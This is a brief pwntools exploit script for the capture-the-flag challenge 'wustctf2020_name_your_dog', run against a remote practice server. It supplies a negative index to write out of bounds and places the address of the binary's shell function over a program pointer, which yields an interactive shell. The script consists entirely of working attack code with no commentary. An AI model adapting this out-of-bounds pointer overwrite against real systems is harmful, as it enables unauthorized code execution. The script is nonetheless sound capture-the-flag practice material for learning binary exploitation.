from pwn import *

elf = ELF('./wustctf2020_name_your_dog')
# io = process('wustctf2020_name_your_dog')
io = remote('node5.buuoj.cn', 27877)

io.sendlineafter(b'Name for which?\n>', b'-7')
io.sendlineafter(b'Give your name plz: ', packing.p32(elf.symbols['shell']))
io.interactive()
